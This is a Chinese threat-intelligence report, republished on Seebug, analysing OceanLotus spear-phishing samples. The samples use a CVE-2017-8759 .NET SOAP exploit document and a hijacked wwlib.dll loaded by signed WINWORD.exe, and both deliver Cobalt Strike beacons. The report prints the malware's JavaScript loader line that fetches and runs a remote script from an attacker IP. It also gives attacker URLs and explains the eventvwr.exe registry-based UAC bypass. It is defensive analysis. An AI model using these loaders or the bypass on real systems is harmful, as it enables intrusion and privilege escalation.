作者：[360威胁情报中心](https://mp.weixin.qq.com/s/IPFKLRZb5GDXXGHioPu4RA "360威胁情报中心")

#### 引言

360威胁情报中心自在2015年首次揭露海莲花（OceanLotus）APT团伙的活动以后，一直密切监控其活动，跟踪其攻击手法和目标的变化。近期被公开的团伙所执行的大规模水坑攻击中，360威胁情报中心发现超过100个国内的网站被秘密控制植入了恶意链接，团伙会在到访水坑网站的用户中选择感兴趣的目标通过诱使其下载执行恶意程序获取控制，此类攻击手法在360威胁情报中心的之前分析中已经有过介绍，详情请访问情报中心的官方Blog：
<http://ti.360.net/blog/> 。

除了水坑方式的渗透，海莲花团伙也在并行地采用鱼叉邮件的恶意代码投递，执行更加针对性的攻击。360安全监测与响应中心在所服务用户的配合下，大量鱼叉邮件被发现并确认，显示其尽可能多地获取控制的攻击风格。除了通常的可执行程序附件Payload以外，360威胁情报中心近期还发现了利用CVE-2017-8759漏洞和Office
Word机制的鱼叉邮件。这类漏洞利用类的恶意代码集成了一些以前所未见的技术，360威胁情报中心在本文中详述其中的技术细节，与安全社区共享以期从整体上提升针对性的防御。

#### 样本分析

海莲花团伙会收集所攻击组织机构对外公布的邮箱，只要有获得渗透机会的可能，就向其投递各类恶意邮件，360威胁情报中心甚至在同一个用户的邮箱中发现两类不同的鱼叉邮件，但所欲达到的目的是一样的：获取初始的恶意代码执行。下面我们剖析其中的两类：CVE-2017-8759漏洞和Office
Word DLL劫持漏洞的利用。

#### CVE-2017-8759漏洞利用样本

我们分析的第一个样本来自鱼叉邮件。邮件主题跟该员工的薪酬信息相关，其中附带了一个DOC文档类型的附件，附件名为 “请查收8月和9月的工资单.doc ”。

![](https://images.seebug.org/content/images/2017/12/244ffc68-af34-4c36-b544-6dbd890bad23.png-w331s)

打开文件会发现其并没有内容，而只是显示了一个空白框和一张模糊不清的图片，显然这是一种企图引诱用户点击打开漏洞文档，然后通过漏洞在系统后台运行恶意代码的社会工程学攻击。

![](https://images.seebug.org/content/images/2017/12/aa8b1a73-d398-4477-9971-f4aa35d0d5e4.png-w331s)

点击空白框可以发现其是一个链接对象，链接地址如下：

![](https://images.seebug.org/content/images/2017/12/daec08cb-23db-4b17-9a29-c88e23402391.png-w331s)

注意到`soap:wsdl=****`这个是CVE-2017-8759漏洞利用的必要元素， 以下我们简单回顾一下CVE-2017-8759漏洞的细节。

#### CVE-2017-8759漏洞简介

CVE-2017-8759是一个.NET Framework漏洞，成因在于.NET库中的SOAP
WSDL解析模块IsValidUrl函数没有正确处理包含回车换行符的情况，导致调用者函数PrintClientProxy发生代码注入，在后续过的过程中所注入的恶意代码得到执行。

漏洞利用导致代码执行的流程如下：

前述所分析的样本中包含`soap:wsdl=http://www.hkbytes.info:80/resource/image.jpg`，这里的`soap:wsdl`标记了接下来要使用的Moniker为Soap
Moniker。

在注册表项HKEY_CLASSES_ROOT\soap中可以找到Soap
Moniker的CLSID和文件路径分别为CLSID：{ecabb0c7-7f19-11d2-978e-0000f8757e2a}和Path:
%systemroot%\system32\comsvcs.dll。

可以看到漏洞触发前的部分堆栈如下：

![](https://images.seebug.org/content/images/2017/12/488c85a4-bc7a-42b5-b728-58dec6511f3d.png-w331s)

Office在绑定了CSoapMoniker并创建实例后，进入到comsvcs!CreateSoapProxy中，会创建一个System.EnterpriseServices.Internal.ClrObjectFactory类的实例（该类在MSDN上的描述为启用客户端SOAP代理的COM组件），代码如下：

![](https://images.seebug.org/content/images/2017/12/6f83cd2a-a79e-47ca-abc8-4b823f737d70.png-w331s)

接着调用ClrObjectFactory类中的CreateFromWsdl()方法，该方法中会对WsdlURL进行解析，然后通过GenAssemblyFromWsdl()生成一个以URL作为名字的dll，将其load到内存中:

![](https://images.seebug.org/content/images/2017/12/0efc0c0e-5515-4d8f-b8aa-adc552272876.png-w331s)

而漏洞正是出现在GenAssemblyFromWsdl()中对Wsdl解析的时候，SOAP WSDL 解析模块WsdlParser的
IsValidUrl()
函数没有正确处理可能包含的回车换行符，使调用IsVailidUrl的PrintClientProxy没能注释掉换行符之后的代码，从而导致了代码注入。相关的漏洞代码如下：

PrintClientProxy

![](https://images.seebug.org/content/images/2017/12/7d12d4f7-1854-4489-8088-dec4f9db0493.png-w331s)

IsValidUrl

![](https://images.seebug.org/content/images/2017/12/6d5d12ad-0b7e-4f40-a910-4c7a49b35b43.png-w331s)

调用栈大致如下：

    
    
    System.Runtime.Remoting.MetadataServices.WsdlParser.URTComplexType.PrintClientProxy()
    System.Runtime.Remoting.MetadataServices.WsdlParser.URTComplexType.PrintCSC()
    System.Runtime.Remoting.MetadataServices.WsdlParser.PrintCSC()
    System.Runtime.Remoting.MetadataServices.WsdlParser.StartWsdlResolution()
    System.Runtime.Remoting.MetadataServices.WsdlParser.Parse()
    System.Runtime.Remoting.MetadataServices.SUDSParser.Parse()
    System.Runtime.Remoting.MetadataServices.MetaData.ConvertSchemaStreamToCodeSourceStream(bool, string, Stream, ArrayList, string, string)
    System.EnterpriseServices.Internal.GenAssemblyFromWsdl.Generate()
    System.EnterpriseServices.Internal.ClrObjectFactory.CreateFromWsdl()
    …..

由于 hxxp://www.hkbytes.info:80/resource/image.jpg
已经下载不到，这里用一个POC来代替原本image.jpg中的代码来说明漏洞如何被利用：

![](https://images.seebug.org/content/images/2017/12/57688c5c-7795-4c17-9dac-c0ca920a0e9b.png-w331s)

如上图的POC中所示，由于第二行的soap:address
locaotion后面紧跟着一个换行符，经过上述的处理流程后，导致生成的Logo.cs文件内容如下，可以看到本该被注释掉的if
(System.AppDomain…等代码并未被注释掉。

![](https://images.seebug.org/content/images/2017/12/5ca94fa3-37e2-4cf2-8371-852541072ebb.png-w331s)

回到`GenAssemblyFromWsdl()`函数后，调用`GenAssemblyFromWsdl.Run()`编译生成的Logo.cs，生成以URL命名的dll：`httpswwwhkbytesinfo80resourceimagejpg.dll`，并将其加载到内存中，此时被注入的代码便得以执行起来。具体到当前的POC例子，我们可以看到被注入的代码就是将前面的字符串以“?”分割成一个Array，然后调用System.Diagnostics.Process.Start()启动新进程。进程名为Array[1]（即mshta.exe），参数为Array[2]（即要下载执行的恶意载荷）。

#### 样本文档的Payload剖析

样本文件中的Payload被设置在objdata对象中，可以看到其数据是被混淆过的：

![](https://images.seebug.org/content/images/2017/12/c6d12fd9-5f51-4fa4-a849-0afc65b7f097.png-w331s)

混淆方式为把一些没有意义的字符串填充到objdata里面，比如 {*[10位随机字母]}，[10位随机字母]

![](https://images.seebug.org/content/images/2017/12/1b18a5df-66f7-4463-a62a-beaa2f7f0e72.png-w331s)

使用正则表达式替换掉这些用于混淆的字符串，比如：

  1. 用 {\\*\\[a-zA-Z]{10}}搜索替换 “{*\enhftkpilz}”
  2. 用 \\[a-zA-Z]{10} 搜索替换 “\akyrwuwprx”

得到的结果如下：

![](https://images.seebug.org/content/images/2017/12/4ac5206d-53e6-471d-9983-8bedfb9b37cb.png-w331s)

对混淆用的字串做进一步的清理，最终结果如下:

![](https://images.seebug.org/content/images/2017/12/219b7bd1-bae9-4dad-8f64-65af3f484860.png-w331s)

将其转换成二进制形式后利用Office CVE-2017-8759漏洞的特征数据显现：

![](https://images.seebug.org/content/images/2017/12/01c79621-eb36-43ce-a93f-8bad930c2b4c.png-w331s)

其中的wsdl=http://www.hkbytes.info:80/resource/image.jpg 这个链接指向的文件目前已经下载不到。

#### 基于域名关联所得样本分析

上节分析看到的 http://www.hkbytes.info:80/resource/image.jpg
虽然已无法下载，但后续通过基于域名的排查关联，360威胁情报中心定位到该域名下另一个还能下载得到的样本链接：<http://www.hkbytes.info/logo.gif>
。其中包含的Powershell恶意代码代码如下：

![](https://images.seebug.org/content/images/2017/12/68f9881c-343a-404f-8c44-2c254092e2dc.png-w331s)

经过6次嵌套解码后的可读代码如下：

![](https://images.seebug.org/content/images/2017/12/d550a7d7-1699-4879-89a7-a24f85f5374b.png-w331s)

Shellcode由CobaltStrike生成，会在内存中解密加载Beacon模块，之前360威胁情报中心对此shellcode做过专门的分析，详情见：<http://www.freebuf.com/articles/paper/104638.html>

![](https://images.seebug.org/content/images/2017/12/bf2e03be-db15-4981-b4d8-0399ffed96b4.png-w331s)

解开配置文件后可以找到通信域名和通过管道与模块通信的名字：

![](https://images.seebug.org/content/images/2017/12/3fa60832-9f14-49b5-a9d4-dd9b35c1a8ab.png-w331s)

调试分析发现启动Powershell的父进程为eventvrw.exe：
![](https://images.seebug.org/content/images/2017/12/9f6bdd49-8098-41bf-bc6d-e06c8b62a3f5.png-w331s)

进程信息如下：
![](https://images.seebug.org/content/images/2017/12/1160e2dc-a1f9-44f8-9f8c-86efefea30e5.png-w331s)

检查相关的注册表项，发现被修改指向了Powershell，这是一种已知的绕过UAC的技巧，我们在下节详细介绍一下。

#### 绕过 UAC技术解析介绍

绕过Windows
UAC的目的是不经系统提示用户手工确认而秘密执行特权程序，当前样本使用的绕过方式为修改一个不需要UAC就能写的注册表的项。这里所涉及的注册表项会被eventvwr.exe首先读取并运行里面的键值指定的程序，而eventvwr.exe不需要UAC权限。如下图所示该键值被修改为Powershell加载恶意代码：

![](https://images.seebug.org/content/images/2017/12/c0c35347-4c75-488a-ae06-f186f37750aa.png-w331s)

正常系统中这个注册表键值在HKCU项里是没有的，只有在HKCR下有这个注册表键值，正常的值如下：

![](https://images.seebug.org/content/images/2017/12/bb337ed2-8e9b-4dc1-9ed0-8dcce23e1d13.png-w331s)

通常打开eventvwr .exe，eventvwr
.exe先会到HKCU查找mscfile关联打开的方式，而这个目录下默认是没有的，这时会转到HKCR下的mscfile里去找，如找到，启动mmc.exe，因为写HKCU这个注册表键值不需要UAC，把值改成Powershell可以导致绕过UAC。

![](https://images.seebug.org/content/images/2017/12/452fd9d7-c2dc-41ca-836e-100f851c35eb.png-w331s)

经过验证确认为HKCU增加改注册表项并不需要UAC权限，以下为添加注册表成功的截图：

![](https://images.seebug.org/content/images/2017/12/c35684ac-6a80-46f9-9ef7-a8fa65b64e33.png-w331s)

测试代码如下：
![](https://images.seebug.org/content/images/2017/12/c1752f48-88fa-40ed-b989-4cc3fe7ee077.png-w331s)

因此通过eventvwr即可以让需要UAC执行权限的程序在运行时不会弹出UAC权限确认框，如下所示将注册表改成”海马玩”的路径：

![](https://images.seebug.org/content/images/2017/12/2149d841-2037-4ba1-b850-f7e01592bf80.png-w331s)
![](https://images.seebug.org/content/images/2017/12/42fb6ed8-7ebd-473c-98f5-5a1173aa3c25.png-w331s)

正常海马玩运行时需要提升UAC权限：
![](https://images.seebug.org/content/images/2017/12/8994d25d-e172-4c1e-8eee-b4e9f265516c.png-w331s)

利用当前这个绕过方法，启动eventvwr，不需要UAC就可以打开程序：

![](https://images.seebug.org/content/images/2017/12/6f4ca720-eca6-4227-bf91-7839b6df6898.png-w331s)

#### Word DLL劫持漏洞利用样本

360安全监测与响应中心为用户处理海莲花团伙感染事件过程中，存在CVE-2017-8759漏洞利用样本的同一台机器上被发现另一个海莲花团伙的攻击样本，也是通过鱼叉邮件的方式投递：

![](https://images.seebug.org/content/images/2017/12/e6c2a4d0-1d51-4376-9661-50691c14cf49.png-w331s)

这个看起来与加薪相关的社工邮件附件利用了一种与上述CVE-2017-8759漏洞不同的恶意代码加载机制。

#### WinWord的wwlib.dll劫持

把压缩包解压以后，可以看到其中包含一个名为 “2018年加薪及任命决定征求意见表
.exe”的可执行程序，这个程序其实就是一个正常微软的WINWORD.exe 的主程序，带有微软的签名，所以其WinWord的图标也是正常的：

![](https://images.seebug.org/content/images/2017/12/0289820c-77f8-4a61-b1ed-21eb2fbef9b5.png-w331s)

WINWORD.exe会默认加载同目录下的wwlib.dll，而wwlib.dll是攻击者自己的，所以本质上这还是一个DLL劫持的白利用加载恶意代码方式。

#### 恶意代码加载流程

分析显示wwlib.dll的功能就是通过COM组件调用JavaScript本地执行一个脚本，相关的代码在102资源里：

![](https://images.seebug.org/content/images/2017/12/3d91a682-f317-48ff-9418-acb399753c02.png-w331s)

其中的脚本为：

javascript:"..\mshtml.dll,RunHTMLApplication
";document.write();try{GetObject("script:http://27.102.102.139:80/lcpd/index.jpg")}catch(e){};close();

![](https://images.seebug.org/content/images/2017/12/c1c6fe32-197a-4382-b40d-dc6de26f48e7.png-w331s)

调用COM组件执行脚本：
![](https://images.seebug.org/content/images/2017/12/85e7875d-7ea3-446a-88c0-ed28908c19ae.png-w331s)

执行的脚本 http://27.102.102.139:80/lcpd/index.jpg 内容如下：

![](https://images.seebug.org/content/images/2017/12/94dcf8f2-f203-4de1-81ad-5e7b03d2afb6.png-w331s)

前面的变量serialized_obj是经过base64编码后的C#程序，该脚本调用程序的LoadShell方法，在内存中加载shl变量，下图为解密后的C#程序的LoadShell方法：

![](https://images.seebug.org/content/images/2017/12/17dfa0ff-6671-4cb4-aa75-329e544f99f6.png-w331s)

接下来程序会把传过来的string做base64解密在内存中加载执行，下图为解密后的string，很容易看出来这又是Cobalt
Strike的Shellcode Payload：

![](https://images.seebug.org/content/images/2017/12/0d3e2922-d39a-45fb-a9b0-f9fdcdf6a657.png-w331s)

Shellcode会连接 https://27.102.102.139/oEcE
地址下载下一步攻击荷载，而oEcE就是前面分析的CobaltStrike的释放Beacon模块的Shellcode：
![](https://images.seebug.org/content/images/2017/12/fbb5d01a-b5c6-4bec-89de-409cdffc42d2.png-w331s)

经过和0x69异或配置文件解密出的配置文件如下：

![](https://images.seebug.org/content/images/2017/12/472498d7-36aa-4798-b9dd-97c6b3c637c0.png-w331s)

执行完Shellcode的同时会从资源中释放ID为102的doc文件并打开：

![](https://images.seebug.org/content/images/2017/12/8b6f5d0e-9d76-436f-a32a-3c4ca1ff4982.png-w331s)
![](https://images.seebug.org/content/images/2017/12/e79bd3eb-49f4-4eb3-aca6-aac87eaf6080.png-w331s)
![](https://images.seebug.org/content/images/2017/12/43fc5f93-1082-4b3d-aa57-86c1c7592ae9.png-w331s)

打开后的界面如下以迷惑攻击对象，以为自己刚才打开的就是word文档：

![](https://images.seebug.org/content/images/2017/12/f9841dc5-f5a9-4b39-979f-c02a7f1b1388.png-w331s)

#### 溯源和关联分析

通过在360威胁情报中心搜索 www.hkbytes.info 该域名，如图：

![](https://images.seebug.org/content/images/2017/12/e32213df-6ca2-4c92-a464-f0f4c685b28b.png-w331s)

搜索IP的结果如下：

![](https://images.seebug.org/content/images/2017/12/e463641e-ab77-49ab-a5a3-2b6244161abc.png-w331s)

该域名最早看到时间是2017年9月12日，而域名注册时间为2017年1月4日，可见海莲花团伙会为将来的攻击预先储备网络资源。

![](https://images.seebug.org/content/images/2017/12/8a421fbd-3a92-45e1-a0c0-055317ec1661.png-w331s)
![](https://images.seebug.org/content/images/2017/12/2cd7f834-4935-40b0-b5ca-2cfc761fb89a.png-w331s)

#### 总结

为了成功渗透目标，海莲花团伙一直在积极跟踪利用各种获取恶意代码执行及绕过传统病毒查杀体系的方法，显示团伙有充足的攻击人员和技术及网络资源储备。对于感兴趣的目标，团伙会进行反复的攻击渗透尝试，360威胁情报中心和360安全监测与响应中心所服务的客户中涉及军工、科研院所、大型企业等机构几乎都受到过团伙的攻击，那些单位对外公布的邮箱几乎都收到过鱼叉邮件，需要引起同类组织机构的高度重视。

#### 参考链接

[“FILELESS” UAC BYPASS USING EVENTVWR.EXE AND REGISTRY
HIJACKING](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/ "“FILELESS” UAC BYPASS USING EVENTVWR.EXE
AND REGISTRY HIJACKING")

#### 附件

IOC ![](https://images.seebug.org/content/images/2017/12/094f6dde-2c3e-47fb-bad4-4a075eba7160.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/467/>

